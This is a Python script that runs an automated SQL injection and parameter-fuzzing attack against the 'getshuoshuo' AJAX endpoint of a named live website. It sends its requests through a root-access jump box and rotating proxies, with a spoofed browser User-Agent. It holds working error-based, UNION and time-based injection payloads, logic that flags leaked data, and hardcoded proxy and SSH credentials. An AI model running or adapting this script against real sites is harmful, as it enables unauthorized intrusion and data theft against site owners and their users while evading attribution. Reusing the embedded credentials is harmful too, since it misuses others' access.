#!/usr/bin/env python3
"""qq1.lol getshuoshuo HTTP 500 fuzz — runs curl on jump box via QG proxy"""
import json
import os
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "shuoshuo_fuzz.log"
HITS = OUT / "shuoshuo_hits.jsonl"
REPORT = OUT / "shuoshuo_report.json"

QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
JP_PASS = os.environ.get("JP_PASS", "DX4LmrDaPfd9")
JP_HOST = os.environ.get("JP_HOST", "42.240.167.114")
REMOTE_JAR = "/tmp/qq1_shuoshuo.jar"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"

report = {"ts": datetime.now().isoformat(), "results": [], "hits": []}


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body="", meta=None):
    rec = {"kind": kind, "detail": detail, "body": (body or "")[:8000], "meta": meta or {}}
    report["hits"].append(rec)
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


def ssh_run(script, timeout=120):
    cmd = ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script]
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired as e:
        return type("R", (), {"stdout": e.stdout or "", "stderr": "timeout", "returncode": -1})()


def get_proxy_on_jump():
    script = f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'"
    r = ssh_run(script, timeout=30)
    try:
        d = json.loads(r.stdout)
        if d.get("code") == "SUCCESS":
            srv = d["data"][0]["server"]
            return f"http://{QG_KEY}:{QG_PWD}@{srv}", srv
    except Exception as e:
        log(f"proxy parse err: {e} {r.stdout[:200]}")
    return None, None


def remote_curl(px, url, method="GET", post=None, max_time=20):
    """Run curl entirely on jump box."""
    hdr = f"-H 'Referer: {BASE}/' -H 'X-Requested-With: XMLHttpRequest'"
    post_part = ""
    if method == "POST" and post:
        post_part = f"-X POST -H 'Content-Type: application/x-www-form-urlencoded' -d {shlex.quote(post)}"
    script = (
        f"curl -sk --max-time {max_time} -x {shlex.quote(px)} -b {REMOTE_JAR} -c {REMOTE_JAR} "
        f"-A {shlex.quote(UA)} {hdr} {post_part} -w '\\n__HTTP:%{{http_code}}__TIME:%{{time_total}}' "
        f"{shlex.quote(url)}"
    )
    r = ssh_run(script, timeout=max_time + 30)
    out = r.stdout or ""
    body, code, elapsed = "", "000", 0.0
    if "__HTTP:" in out:
        body, tail = out.split("__HTTP:", 1)
        body = body.strip()
        m = re.match(r"(\d+)__TIME:([\d.]+)", tail.strip())
        if m:
            code, elapsed = m.group(1), float(m.group(2))
    return body, code, elapsed


def bootstrap_session(px, retries=6):
    for i in range(retries):
        remote_curl(px, f"{BASE}/")
        buy, code, _ = remote_curl(px, f"{BASE}/?mod=buy&cid=14&tid=131")
        if code == "200" and "hashsalt" in buy:
            m = re.search(r"var hashsalt=(.+);", buy)
            if m:
                try:
                    hs = subprocess.run(
                        ["node", "-e", f"var hashsalt={m.group(1)}; console.log(hashsalt)"],
                        capture_output=True, text=True, timeout=8,
                    ).stdout.strip()
                    if hs and len(hs) >= 16:
                        return hs
                except Exception:
                    pass
        log(f"  bootstrap retry {i+1} buy_code={code} len={len(buy)}")
        px2, srv = get_proxy_on_jump()
        if px2:
            px = px2
        time.sleep(2)
    return None


def test_case(px, hs, label, uin, page=1, hs_override=None, method="GET", max_time=20):
    use_hs = hs if hs_override is None else hs_override
    if method == "GET":
        url = f"{BASE}/ajax.php?act=getshuoshuo&uin={quote(str(uin), safe='')}&page={page}&hashsalt={quote(str(use_hs), safe='')}"
        body, code, elapsed = remote_curl(px, url, max_time=max_time)
    else:
        post = f"uin={quote(str(uin), safe='')}&page={page}&hashsalt={quote(str(use_hs), safe='')}"
        body, code, elapsed = remote_curl(px, f"{BASE}/ajax.php?act=getshuoshuo", "POST", post, max_time=max_time)

    rec = {"label": label, "uin": str(uin)[:80], "code": code, "elapsed": elapsed, "len": len(body), "body": body[:400]}
    report["results"].append(rec)

    if body and '"code":0' in body:
        hit("data_leak", label, body, rec)
    elif body and any(x in body.lower() for x in ("mysql", "syntax", "sql", "xpath", "extractvalue", "updatexml", "~")):
        hit("sqli_error", label, body, rec)
    elif code == "200" and body and '"code":-5' not in body and len(body) > 20:
        hit("unexpected_200", label, body, rec)

    log(f"  {label:35} HTTP={code} t={elapsed:.2f}s len={len(body)} {body[:90]!r}")
    return rec


def main():
    log("=== SHUOSHUO FUZZ v2 START ===")
    px, srv = get_proxy_on_jump()
    if not px:
        log("FATAL: no proxy")
        return
    log(f"proxy {srv}")

    # clear remote jar
    ssh_run(f"rm -f {REMOTE_JAR}")

    hs = bootstrap_session(px)
    if not hs:
        log("FATAL: no hashsalt after retries")
        return
    log(f"hashsalt={hs}")

    log("=== [1] baseline ===")
    for uin in ["", "0", "00", "1", "2", "10", "100", "1000", "10000", "10001", "123456789", "abc", "-1"]:
        test_case(px, hs, f"base_{uin!r}", uin)

    log("=== [2] SQLi error-based ===")
    sqli = [
        "10000'", '10000"', "10000' OR '1'='1", "10000' AND '1'='2",
        "10000' UNION SELECT 1,2,3-- -", "10000' UNION SELECT null,null,null-- -",
        "-1 OR 1=1", "1 OR 1=1",
        "10000' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        "10000' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -",
        "10000' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "10000' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -",
    ]
    for p in sqli:
        test_case(px, hs, f"sqli_{p[:30]}", p)

    log("=== [3] SQLi time-based (max_time=8) ===")
    time_payloads = [
        "10000' AND SLEEP(3)-- -",
        "10000' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",
        "1' AND SLEEP(3) AND '1'='1",
        "10000) AND SLEEP(3)#",
        "10000' OR SLEEP(3)#",
        "10000' AND BENCHMARK(5000000,SHA1('test'))-- -",
    ]
    for p in time_payloads:
        rec = test_case(px, hs, f"time_{p[:25]}", p, max_time=8)
        if rec["elapsed"] >= 2.8 and rec["code"] not in ("000",):
            hit("time_sqli", p, rec.get("body", ""), rec)

    log("=== [4] type confusion ===")
    for uin in ["10000.0", "+10000", "010000", "0x2710", "1e4", "true", "false", "null", "[]", "1,2"]:
        test_case(px, hs, f"type_{uin}", uin)

    log("=== [5] hashsalt fuzz ===")
    for s in ["", "0", hs, hs + "x", hs[::-1], "' OR '1'='1", "deadbeef" * 4]:
        test_case(px, hs, f"hs_{s[:16]!r}", "10000", hs_override=s)

    log("=== [6] page fuzz ===")
    for pg in ["0", "-1", "1'", "1 OR 1=1", "99999"]:
        test_case(px, hs, f"page_{pg}", "10000", page=pg)

    log("=== [7] POST method ===")
    for uin in ["10000", "10000' OR '1'='1", "10000' AND SLEEP(3)-- -"]:
        test_case(px, hs, f"post_{uin[:20]}", uin, method="POST", max_time=8)

    # code distribution
    dist = {}
    for r in report["results"]:
        c = r["code"]
        dist[c] = dist.get(c, 0) + 1
    report["code_dist"] = dist
    report["hit_count"] = len(report["hits"])
    with open(REPORT, "w") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    log(f"=== DONE hits={report['hit_count']} dist={dist} ===")


if __name__ == "__main__":
    main()
